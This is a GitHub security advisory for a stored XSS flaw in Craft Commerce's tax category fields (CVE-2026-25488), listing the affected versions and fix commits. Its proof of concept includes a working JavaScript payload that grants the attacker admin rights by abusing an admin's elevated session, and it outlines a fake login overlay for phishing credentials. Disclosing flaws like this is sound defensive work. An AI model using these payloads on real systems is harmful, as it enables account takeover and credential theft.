# [M] Craft Commerce has Stored XSS in Tax Categories (Name & Description) Fields Leading to Potential Privilege Escalation

## Summary
Severity: Medium
Advisory: GHSA-p6w8-q63m-72c8
CVE: CVE-2026-25488
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:P/VC:N/VI:N/VA:N/SC:L/SI:H/SA:N (CVSS_V4)
Published: 2026-02-02
Source: https://github.com/advisories/GHSA-p6w8-q63m-72c8
Type: github-advisory

## Affected
- Packagist: `craftcms/commerce` — affected >=5.0.0-RC1 <5.5.2
- Packagist: `craftcms/commerce` — affected >=4.0.0-RC1 <4.10.1

## Details
## Summary

A stored XSS vulnerability in Craft Commerce allows attackers to execute malicious JavaScript in an administrator’s browser. This occurs because the Tax Categories (Name & Description) fields in the **Store Management** section are not properly sanitized before being displayed in the admin panel.

---
## Proof of Concept

### Requirments
- General permissions:
	- Access the control panel
	- Access Craft Commerce
- Craft Commerce permissions:
	- Manage store settings
	- Manage taxes
- An active administrator elevated session

### Steps to Reproduce
1. Log in to the Admin Panel with the attacker account with the permissions mentioned above.
2. Navigate to **Commerce** -> **Store Management** -> **Tax Categories** (`/admin/commerce/store-management/primary/taxcategories`).
3. Create a new tax category.
4. In the **Name** or **Description** field, enter the following payload:
```html
<img src=x onerror="alert(document.domain)">
```
4. Click **Save** and you'll be redirected back to the previous page.
5. Notice the alert proving JavaScript execution.

### Privilege Escalation to Administrator:
1. Do the same steps above, but replace the payload with a malicious one.
2. The following payload elevates the attacker’s account to Admin if there’s already an elevated session, replace the `<UserID>` with your attacker id:
```html
<img src=x onerror="fetch('/admin/users/<UserID>/permissions',{method:'POST',body:`CRAFT_CSRF_TOKEN=${Craft.csrfTokenValue}&userId=<UserID>&admin=1&action=users/save-permissions`,headers:{'content-type':'application/x-www-form-urlencoded'}})">
```

3. In another browser, log in as an admin & go to the vulnerable page (tax categories page).
4. Go back to your attacker account & notice you are now an admin.

The privilege escalation requires an elevated session. In a real-world scenario, an attacker can automate the process by forcing a logout if the victim’s session is stale; upon re-authentication, the stored XSS payload executes within a fresh elevated session to complete the attack.

Or even easier (and smarter), an attacker (using the XSS) can create a fake 'Session Expired' login modal overlay. Since it’s on the trusted domain, administrators will likely enter their credentials, sending them directly to the attacker.

### References:

https://github.com/craftcms/commerce/commit/fa273330807807d05b564d37c88654cd772839ee

## References
- https://github.com/craftcms/commerce/security/advisories/GHSA-p6w8-q63m-72c8
- https://nvd.nist.gov/vuln/detail/CVE-2026-25488
- https://github.com/craftcms/commerce/commit/fa273330807807d05b564d37c88654cd772839ee
- https://github.com/craftcms/commerce
- https://github.com/craftcms/commerce/releases/tag/4.10.1
- https://github.com/craftcms/commerce/releases/tag/5.5.2
